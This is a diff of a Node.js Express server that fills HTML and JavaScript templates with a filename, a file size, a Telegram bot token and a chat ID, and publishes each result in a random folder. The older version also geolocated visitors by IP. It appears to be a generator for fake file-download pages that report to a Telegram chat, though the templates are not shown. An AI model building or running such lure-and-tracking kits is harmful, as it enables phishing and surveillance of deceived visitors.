@@ -1,72 +1,114 @@
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
-const bodyParser = require("body-parser");
-const crypto = require("crypto");
-const fetch = require("node-fetch");
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
 
 const app = express();
-const PORT = process.env.PORT || 8080;
+const port = 8080;
 
-// Middleware untuk menangani JSON dan file statis
-app.use(bodyParser.json());
-app.use("/public", express.static(path.join(__dirname, "public")));
+// Helper: Generate random folder name
+function generateRandomFolderName() {
+    return crypto.randomBytes(5).toString('hex'); // Random 10-character string
+}
 
-// Helper untuk membuat folder random
-const generateRandomDir = () => crypto.randomBytes(5).toString("hex");
+// Helper: Generate dynamic HTML
+function generateHtml(filename, size, chatId) {
+    const templatePath = path.join(__dirname, 'public', 'templates', 'index.template.html');
+    const template = fs.readFileSync(templatePath, 'utf-8');
+    return template
+        .replace('{{filename}}', filename)
+        .replace('{{size}}', size)
+        .replace('{{chatId}}', chatId);
+}
 
-// API untuk mendapatkan IP pengunjung
-app.get("/api/ip", async (req, res) => {
-  try {
-    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-    const response = await fetch(`https://ipapi.co/${ip}/json/`);
-    const data = await response.json();
-    res.status(200).json({ ip: data.ip, location: data.city });
-  } catch (err) {
-    res.status(500).json({ error: "Failed to fetch IP" });
-  }
+// Helper: Generate dynamic JS
+function generateJs(botToken, chatId) {
+    const templatePath = path.join(__dirname, 'public', 'templates', 'main.template.js');
+    const template = fs.readFileSync(templatePath, 'utf-8');
+    return template
+        .replace('{{botToken}}', botToken)
+        .replace('{{chatId}}', chatId);
+}
+
+// Serve static files
+app.use('/static', express.static(path.join(__dirname, 'public', 'templates')));
+
+// Endpoint to generate dynamic content
+app.get('/', (req, res) => {
+    const { filename, size, chatId, botToken } = req.query;
+
+    if (!filename || !size || !chatId || !botToken) {
+        return res.status(400).send('Missing query parameters: filename, size, chatId, or botToken.');
+    }
+
+    // Create a random folder for the generated content
+    const randomFolder = generateRandomFolderName();
+    const outputPath = path.join(__dirname, 'public', randomFolder);
+
+    if (!fs.existsSync(outputPath)) {
+        fs.mkdirSync(outputPath, { recursive: true });
+    }
+
+    // Generate index.html
+    const htmlContent = generateHtml(filename, size, chatId);
+    fs.writeFileSync(path.join(outputPath, 'index.html'), htmlContent);
+
+    // Generate main.js
+    const jsContent = generateJs(botToken, chatId);
+    fs.writeFileSync(path.join(outputPath, 'main.js'), jsContent);
+
+    // Send response with the path to the generated folder
+    res.status(200).send({
+        message: 'Generated successfully',
+        resultUrl: `/static/${randomFolder}/index.html`,
+        creator: 'YudaMods',
+    });
 });
 
-// Endpoint utama untuk membuat file dinamis
-app.get("/generate", (req, res) => {
-  const { chatId, filename, size } = req.query;
-
-  if (!chatId || !filename || !size) {
-    return res.status(400).json({ error: "Missing required parameters" });
-  }
-
-  const randomDir = generateRandomDir();
-  const dirPath = path.join(__dirname, "results", randomDir);
-  fs.mkdirSync(dirPath, { recursive: true });
-
-  // Generate index.html
-  const htmlContent = fs
-    .readFileSync(path.join(__dirname, "templates/index.template.html"), "utf8")
-    .replace("{{filename}}", filename)
-    .replace("{{size}}", size)
-    .concat(`\n<!-- Creator: YudaMods -->`); // Tambahkan komentar creator di HTML
-  fs.writeFileSync(path.join(dirPath, "index.html"), htmlContent);
-
-  // Generate main.js
-  const jsContent = fs
-    .readFileSync(path.join(__dirname, "templates/main.template.js"), "utf8")
-    .replace("{{botToken}}", "your-telegram-bot-token")
-    .replace("{{chatId}}", chatId)
-    .concat(`\n// Creator: YudaMods`); // Tambahkan komentar creator di JS
-  fs.writeFileSync(path.join(dirPath, "main.js"), jsContent);
-
-  res.status(200).json({
-    message: "File generated successfully",
-    url: `/results/${randomDir}/index.html`,
-    creator: "YudaMods",
-  });
+// Custom 404 Handler
+app.use((req, res) => {
+    res.status(404).send(`
+        <html>
+        <head>
+            <title>404 - Not Found</title>
+            <style>
+                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
+                h1 { color: #343a40; }
+                a { text-decoration: none; color: #007bff; }
+            </style>
+        </head>
+        <body>
+            <h1>404 - Page Not Found</h1>
+            <p>Sorry, the page you are looking for does not exist.</p>
+            <a href="/">Go Back Home</a>
+        </body>
+        </html>
+    `);
 });
 
+// Error handler
+app.use((err, req, res, next) => {
+    console.error(err.stack);
+    res.status(500).send(`
+        <html>
+        <head>
+            <title>500 - Internal Server Error</title>
+            <style>
+                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
+                h1 { color: #dc3545; }
+                a { text-decoration: none; color: #007bff; }
+            </style>
+        </head>
+        <body>
+            <h1>500 - Internal Server Error</h1>
+            <p>Something went wrong. Please try again later.</p>
+            <a href="/">Go Back Home</a>
+        </body>
+        </html>
+    `);
+});
 
-// Menyediakan folder hasil untuk diakses
-app.use("/results", express.static(path.join(__dirname, "results")));
-
-// Jalankan server
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+// Start server
+app.listen(port, () => {
+    console.log(`Server is running at http://localhost:${port}`);
 });
